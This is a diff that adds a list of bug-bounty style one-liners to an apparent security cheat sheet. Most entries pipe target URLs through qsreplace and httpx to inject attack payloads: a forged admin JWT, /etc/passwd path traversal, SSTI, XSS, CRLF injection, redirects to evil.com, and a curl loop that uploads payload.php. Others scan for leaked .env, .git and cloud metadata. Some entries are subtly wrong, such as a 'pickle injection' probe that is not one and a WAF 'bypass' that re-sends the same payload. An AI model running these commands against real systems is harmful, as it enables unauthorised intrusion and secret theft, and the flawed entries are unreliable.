@@ -1320,4 +1320,111 @@ cat all_urls.txt | qsreplace '__proto__[test]=polluted' | httpx -silent -fr 'pol
 cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_found.txt
 ```
 
+Here are the converted commands:
 
+🔐  JWT None Algorithm Bypass Check  
+```bash
+cat all_urls.txt | qsreplace 'token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none_bypass.txt
+```
+
+🚀  Session Fixation via Set-Cookie  
+```bash
+cat subdomains.txt | httpx -silent -H "Cookie: sessionid=attacker-session" -o session_fixation.txt
+```
+
+🛜  Open Redirects  
+```bash
+cat urls.txt | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
+```
+
+🗂️  Exposed .git Folder  
+```bash
+cat subdomains.txt | httpx -silent -path /.git/HEAD -mc 200 -o git_exposed.txt
+```
+
+🌍  Exposed .env Files (Secrets Leak)  
+```bash
+cat subdomains.txt | httpx -silent -path /.env -mc 200 -o env_leaks.txt
+```
+
+🧬  GraphQL Introspection Enabled  
+```bash
+cat subdomains.txt | httpx -silent -path /graphql -x POST -body '{"query":"query IntrospectionQuery { __schema { types { name } } }"}' -fr 'data' -o graphql_introspection.txt
+```
+
+Insecure CORS (Wildcard or Null)  
+```bash
+cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr "https://evil.com" -o insecure_cors.txt
+```
+
+📂  Backup Files Discovery (.zip, .sql, etc)  
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db.sql\n/site_backup.tar.gz') -mc 200 -o backup_files.txt
+```
+
+📊  Admin Panels Discovery  
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/dashboard\n/panel\n/cp') -mc 200 -o admin_panels.txt
+```
+
+💀  Server Side Template Injection (SSTI)  
+```bash
+cat all_urls.txt | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti.txt
+```
+
+📋  Path Traversal (../ Disclosure)  
+```bash
+cat all_urls.txt | qsreplace '../../../../etc/passwd' | httpx -silent -fr 'root:x' -o path_traversal.txt
+```
+
+🐍  Python Pickle Injection (if Flask or Python backend)  
+```bash
+cat all_urls.txt | qsreplace '__class__=os.system&cmd=id' | httpx -silent -fr 'uid=' -o pickle_injection.txt
+```
+
+CRLF Injection (Header Splitting)  
+```bash
+cat all_urls.txt | qsreplace '%0d%0aHeader: evil' | httpx -silent -fr 'Header: evil' -o crlf.txt
+```
+
+💾  Exposed Database Admin Panels  
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin\n/adminer\n/sql') -mc 200 -o db_admin_panels.txt
+```
+
+🧱  File Upload Misconfig (Can upload PHP/JSP)  
+```bash
+cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.php' {} -s -o - | grep 'shell_exec' -B 2
+```
+
+🕵️‍♂️  Cloud Metadata API Exposure (AWS/GCP)  
+```bash
+cat subdomains.txt | httpx -silent -path /latest/meta-data/ -mc 200 -o metadata_exposed.txt
+```
+
+💣  CRLF in Redirect Location Header  
+```bash
+cat urls.txt | qsreplace '%0d%0aLocation:%20https://evil.com' | httpx -silent -fr 'evil.com' -o crlf_redirect.txt
+```
+
+📑  XSS in JSON Response (Reflected)  
+```bash
+cat urls.txt | qsreplace '"><script>alert(1)</script>' | httpx -silent -fr 'alert(1)' -o xss.json.txt
+```
+
+🔌  Exposed Internal IPs (Debug Responses)  
+```bash
+cat urls.txt | httpx -silent -fr '10\.|172\.|192\.168\.' -o internal_ips.txt
+```
+
+🌐  Misconfigured WAF Bypass  
+```bash
+cat urls.txt | qsreplace '><script>alert(1)</script>' | httpx -silent -mc 403 -o waf_detected.txt
+cat waf_detected.txt | qsreplace '><script>alert(1)</script>' | anew bypass_payloads.txt
+cat bypass_payloads.txt | httpx -silent -mc 200 -o waf_bypass.txt
+```
+
+📤  Information Disclosure via Verb Tampering  
+```bash
+cat subdomains.txt | httpx -silent -method OPTIONS -o verb_tampering.txt
+```
